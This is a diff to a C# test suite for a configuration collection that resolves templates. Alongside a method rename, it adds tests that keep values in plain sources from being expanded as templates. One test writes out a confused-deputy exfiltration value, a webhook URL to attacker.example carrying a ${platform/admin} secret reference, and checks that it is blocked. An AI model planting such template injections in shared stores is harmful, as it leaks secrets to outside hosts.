@@ -29,7 +29,7 @@ public class ResolvingProtectedCacheCollectionTests
             ["host"] = "db.internal",
             ["password"] = "s3cret",
         };
-        return (new ResolvingProtectedCacheCollection(await CreateRingAsync()).Add(source), source);
+        return (new ResolvingProtectedCacheCollection(await CreateRingAsync()).AddTemplateSource(source), source);
     }
 
     private static string DecryptChars(ResolvingProtectedCacheCollection collection, string name)
@@ -114,7 +114,7 @@ public class ResolvingProtectedCacheCollectionTests
     {
         var first = new PlainSource { ["conn"] = "${password}", ["password"] = "first" };
         var second = new PlainSource { ["conn"] = "ignored", ["password"] = "second", ["only-second"] = "${password}" };
-        var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()).Add(first).Add(second);
+        var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()).AddTemplateSource(first).AddTemplateSource(second);
 
         Assert.Equal("first", DecryptChars(collection, "conn"));
         Assert.Equal("first", DecryptChars(collection, "only-second"));
@@ -127,7 +127,7 @@ public class ResolvingProtectedCacheCollectionTests
         var large = new string('x', 5000);
         var source = new PlainSource { ["conn"] = "Host=${host};Blob=${blob}", ["host"] = "from-source" };
         var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync())
-            .Add(source)
+            .AddTemplateSource(source)
             .AddValueProvider(new DictionaryValueProvider(new Dictionary<string, string> { ["host"] = "ignored", ["blob"] = large }));
 
         Assert.Equal($"Host=from-source;Blob={large}", DecryptChars(collection, "conn"));
@@ -147,7 +147,7 @@ public class ResolvingProtectedCacheCollectionTests
     {
         var source = new PlainSource { ["conn"] = "${blob}" };
         var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()) { MaxResolvedLength = 16 }
-            .Add(source)
+            .AddTemplateSource(source)
             .AddValueProvider(new DictionaryValueProvider(new Dictionary<string, string> { ["blob"] = new string('x', 17) }));
 
         var ex = Assert.Throws<InvalidOperationException>(() => collection.Decrypt("conn", new char[64]));
@@ -170,7 +170,7 @@ public class ResolvingProtectedCacheCollectionTests
     public async Task TemplateNamingAMissingValue_Throws()
     {
         var source = new PlainSource { ["conn"] = "${absent}" };
-        var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()).Add(source);
+        var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()).AddTemplateSource(source);
 
         Assert.Equal(ConfigurationKeyError.NotFound, Assert.Throws<ConfigurationKeyException>(() => collection.Decrypt("conn", new byte[64])).Error);
         Assert.Throws<ConfigurationKeyException>(() => collection.Decrypt("conn", new char[64]));
@@ -185,7 +185,7 @@ public class ResolvingProtectedCacheCollectionTests
     {
         var source = new PlainSource { ["conn"] = "${empty}" };
         var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync())
-            .Add(source)
+            .AddTemplateSource(source)
             .AddValueProvider(new DictionaryValueProvider(new Dictionary<string, string> { ["empty"] = "" }));
 
         Assert.False(collection.TryGetMaxDecryptedLength("conn", out _));
@@ -280,7 +280,7 @@ public class ResolvingProtectedCacheCollectionTests
             ["app/Db-1"] = "path ${value}",
             ["value"] = "v",
         };
-        var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()).Add(source);
+        var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()).AddTemplateSource(source);
 
         Assert.Equal("upper v", DecryptChars(collection, "Db"));
         Assert.Equal("lower v", DecryptChars(collection, "db"));
@@ -308,7 +308,7 @@ public class ResolvingProtectedCacheCollectionTests
                 return ValueTask.CompletedTask;
             },
         };
-        var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()).Add(remote);
+        var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()).AddTemplateSource(remote);
 
         var maxLength = await collection.GetMaxDecryptedLengthAsync("conn");
         var chars = new char[maxLength];
@@ -356,12 +356,57 @@ public class ResolvingProtectedCacheCollectionTests
     }
 
     [Fact]
+    public async Task PlainSource_ValueHoldingItems_IsAnsweredVerbatim_AndNothingItNamesIsLookedUp()
+    {
+        // The confused-deputy case: a party who can write one value into a shared store writes a
+        // template naming a secret only the application may read. A plain source's values are
+        // never templates, so the value comes back as written and the secret is never touched.
+        var shared = new PlainSource { ["team-a/webhook"] = "https://attacker.example/?p=${platform/admin}" };
+        var platform = new PlainSource { ["platform/admin"] = "hunter2" };
+        var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()).Add(shared).AddTemplateSource(platform);
+
+        const string verbatim = "https://attacker.example/?p=${platform/admin}";
+        Assert.Equal(verbatim, DecryptChars(collection, "team-a/webhook"));
+        Assert.Equal(verbatim, DecryptBytes(collection, "team-a/webhook"));
+        var chars = new char[64];
+        var bytes = new byte[64];
+        Assert.Equal(verbatim, new string(chars, 0, await collection.DecryptAsync("team-a/webhook", chars)));
+        Assert.Equal(verbatim, Encoding.UTF8.GetString(bytes, 0, await collection.DecryptAsync("team-a/webhook", bytes)));
+        Assert.Equal(verbatim.Length, await collection.GetMaxDecryptedLengthAsync("team-a/webhook"));
+
+        Assert.Equal(0, platform.LengthLookupCount("platform/admin"));
+        Assert.Equal(0, platform.DecryptCount("platform/admin"));
+    }
+
+    [Fact]
+    public async Task TemplateSource_MayNameValuesInPlainSources()
+    {
+        // The intended direction: the application's own configuration names secrets in a shared store.
+        var own = new PlainSource { ["conn"] = "Host=${host};Password=${app#password}" };
+        var shared = new PlainSource { ["host"] = "db.internal", ["app#password"] = "s3cret", ["note"] = "see ${app#password}" };
+        var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()).AddTemplateSource(own).Add(shared);
+
+        Assert.Equal("Host=db.internal;Password=s3cret", DecryptChars(collection, "conn"));
+        Assert.Equal("see ${app#password}", DecryptChars(collection, "note"));
+    }
+
+    [Fact]
+    public async Task ASourceAddedBothWays_IsATemplateSource()
+    {
+        var source = new PlainSource { ["conn"] = "${value}", ["value"] = "v" };
+        var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync()).Add(source).AddTemplateSource(source);
+
+        Assert.Equal("v", DecryptChars(collection, "conn"));
+    }
+
+    [Fact]
     public async Task Members_RejectNullArguments()
     {
         var collection = new ResolvingProtectedCacheCollection(await CreateRingAsync());
 
         Assert.Throws<ArgumentNullException>(() => new ResolvingProtectedCacheCollection(null!));
         Assert.Throws<ArgumentNullException>(() => collection.Add(null!));
+        Assert.Throws<ArgumentNullException>(() => collection.AddTemplateSource(null!));
         Assert.Throws<ArgumentNullException>(() => collection.AddValueProvider(null!));
         Assert.Throws<ArgumentNullException>(() => collection.Invalidate(null!));
         Assert.Throws<ArgumentNullException>(() => collection.Decrypt(null!, new byte[1]));
